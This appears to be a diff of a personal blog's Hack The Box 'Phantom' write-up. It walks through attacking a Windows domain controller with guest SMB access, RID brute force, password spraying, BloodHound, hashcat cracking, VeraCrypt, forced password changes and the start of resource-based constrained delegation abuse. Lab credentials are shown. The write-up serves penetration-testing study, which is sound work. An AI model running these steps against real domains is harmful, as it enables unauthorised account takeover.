@@ -7,7 +7,19 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-04-30T09:25:59.325Z
+  - Port53-DNS-Discovery-Host
+  - Port139-135-SMB-anonymous-login
+  - Port139-135-SMB-rid-brute
+  - Port139-135-SMB-BurteForce
+  - Lateral-Movement-account-verify-nxc
+  - Bloodhound-vectory-view-all-user
+  - Port139-135-SMB-enumerating
+  - Decode-company-name-simple-mutation-hashcat-rule
+  - Decode-veracrypt
+  - Bloodhound-vectory-ForceChangePassword
+  - Bloodhound-vectory-AddAllowedToAct
+  - windows
+lastmod: 2026-05-07T05:34:53.938Z
 ---
 # Box Info
 
@@ -17,9 +29,7 @@ lastmod: 2026-04-30T09:25:59.325Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)
+### PORT & IP SCAN
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -80,6 +90,14 @@ Nmap done: 1 IP address (1 host up) scanned in 112.56 seconds
                                                                     
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port53-DNS-Discovery-Host" >}}The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `phantom.vl`, and the hostname is `DC`.
+
+I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─#  netexec smb 10.129.234.63 --generate-hosts-file hosts
@@ -104,6 +122,14 @@ ff02::2         ip6-allrouters\
 # End of section
 
 {{< /code >}}
+
+### SMB-anonymous
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-anonymous-login" >}} `netexec` already called out that null auth was enabled on this host when I generate the `hosts` file line, but because this is a DC, that’ll always be on. I’ll check for null auth that can do anything and the guest account, and find the guest account can authenticate with no password:
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -383,11 +409,13 @@ base64: ASCII text
 
 ![Pasted image 20260430151048.png](/ob/Pasted%20image%2020260430151048.png)
 
-sadly , I don't know the username
+### SMB-rid-brute
 
-But it can brute force RID’s using a RID-cycle attack:
+{{< toggle "Tag 🏷️" >}}
 
-I’ll use `bash` foo to get a list of users:
+{{< tag "Port139-135-SMB-rid-brute" >}} The guest user doesn’t have privileges to list users on the domain,but it can brute force RID’s using a RID-cycle attack
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -521,6 +549,12 @@ SSPRService
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-BurteForce" >}} Doing the bruteforce with netexec 's --continue-on-success and  --no-bruteforce,Normally, NetExec does a "Many-to-Many" attack. If you give it a file with 10 usernames and a file with 10 passwords, it will make **100 attempts** (trying every single password against every single user).
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# netexec smb 10.129.234.63  -u ./username.txt  -p  'Ph4nt0m@5t4rt!' --continue-on-success   --no-bruteforce | grep '[+]'
@@ -560,6 +594,12 @@ SMB                      10.129.234.63   445    DC               [+] phantom.vl\
 
 the ibryant:Ph4nt0m@5t4rt is valid
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-account-verify-nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.phantom.vl  -u 'ibryant' -p 'Ph4nt0m@5t4rt!'; done
@@ -591,8 +631,6 @@ LDAP        10.129.234.63   389    DC               [+] phantom.vl\ibryant:Ph4nt
 
 ```
 
-not the Pwned !
-
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# nxc ldap  10.129.234.63  -u ibryant  -p  'Ph4nt0m@5t4rt!' --bloodhound -c All --dns-server 10.129.234.63
@@ -603,6 +641,13 @@ LDAP        10.129.234.63   389    DC               Done in 00M 24S
 LDAP        10.129.234.63   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.234.63_2026-04-30_032301_bloodhound.zip
                                                                                                                                                
 ```
+
+### bloodhound
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-view-all-user" >}} Using the cypher to find all users to know who is potential to attack\
+{{< /toggle >}}
 
 {{< code >}}\
 MATCH (u:User)\
@@ -653,6 +698,12 @@ smb: \> ls
 smb: \> 
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-enumerating" >}} Using the netexec 's model of spider\_plus to enumerating all file for easily attack .
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/.nxc/logs]
@@ -866,6 +917,12 @@ The HTB “Machine Information” section says:
 {{< code >}}\
 Should you need to crack a hash, use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character).\
 {{< /code >}}
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Decode-company-name-simple-mutation-hashcat-rule" >}} use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character).
+
+{{< /toggle >}}
 
 `phantom_rules.rules`
 
@@ -1100,7 +1157,11 @@ Stopped: Thu Apr 30 04:09:53 2026
 IT_BACKUP_201123.hc:Phantom2023!                          
 ```
 
-I’ll download the Ubuntu `.deb` package from the [Veracrypt download page](https://veracrypt.io/en/Downloads.html), and install it with `sudo apt install ./veracrypt-1.26.24-Ubuntu-24.04-amd64.deb`. This provides a GUI to load volumes, but I’ll just use the command line:
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Decode-veracrypt" >}} I’ll download the Ubuntu `.deb` package from the https://veracrypt.io/en/Downloads.html, and install it with `sudo apt install ./veracrypt-1.26.24-Ubuntu-24.04-amd64.deb`. This provides a GUI to load volumes, but I’ll just use the command line:
+
+{{< /toggle >}}
 
 ```
 oxdf@hacky$ sudo veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom2023!'
@@ -1137,6 +1198,12 @@ certificate "Server"\
 }\
 }\
 {{< /code >}}
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-account-verify-nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -1249,7 +1316,21 @@ LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6X
 
 ```
 
+### ForceChangePassword
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-ForceChangePassword" >}} I’ll use the `change-password` module in `netexec` to update wsilva’s password
+
+{{< /toggle >}}
+
 ![Pasted image 20260430162511.png](/ob/Pasted%20image%2020260430162511.png)
+
+I’ll mark ibryant as owned, but there’s nothing interesting about them.
+
+I’ll mark svc\_sspr as owned, and it has `ForceChangePassword` over three accounts:
+
+The pre-built query “Shortest paths from Owned object to Tier Zero” (which you always have to uncomment before running) shows a clear path to full domain control:
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -1263,9 +1344,11 @@ CHANGE-P... 10.129.234.63   445    DC               [+] Successfully changed pas
 
 ### AddAllowedToAct
 
-`AddAllowedToAct` really means that this user can edit the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object. This is how resource-based constrained delegation is configured. I set this property on one server saying that another service (user) can authenticate on behalf of other users.
+{{< toggle "Tag 🏷️" >}}
 
-To exploit this, typically it requires a user with a service principal name (SPN). This is most commonly exploited by creating a computer object, as the default AD configuration allows any user to add up to ten computers to the domain. However, on Phantom the machine account quota is set to 0:
+{{< tag "Bloodhound-vectory-AddAllowedToAct  " >}} Discover the AddAllowedToAct on bloodhound that really means that this user can edit the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object. This is how resource-based constrained delegation is configured. I set this property on one server saying that another service (user) can authenticate on behalf of other users.
+
+{{< /toggle >}}
 
 ```
 └─# nxc ldap  dc.phantom.vl   -u svc_sspr   -p  'gB6XTcqVP5MlP7Rc' -M maq
@@ -1276,6 +1359,8 @@ MAQ         10.129.234.63   389    DC               [*] Getting the MachineAccou
 MAQ         10.129.234.63   389    DC               MachineAccountQuota: 0
 
 ```
+
+To exploit this, typically it requires a user with a service principal name (SPN). This is most commonly exploited by creating a computer object, as the default AD configuration allows any user to add up to ten computers to the domain. However, on Phantom the machine account quota is set to 0:
 
 Basically, if I can set a user’s password such that their NTLM hash matches the TGT session key on the DC, all the crypto will work out that the attack works. The steps to run this attack from a Linux host are outlined [on The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users). All of the Python scripts in the following sections come from [Impacket](https://github.com/SecureAuthCorp/impacket), installed with `uv tool install impacket` ([uv cheatsheet](https://0xdf.gitlab.io/cheatsheets/uv#)).
 
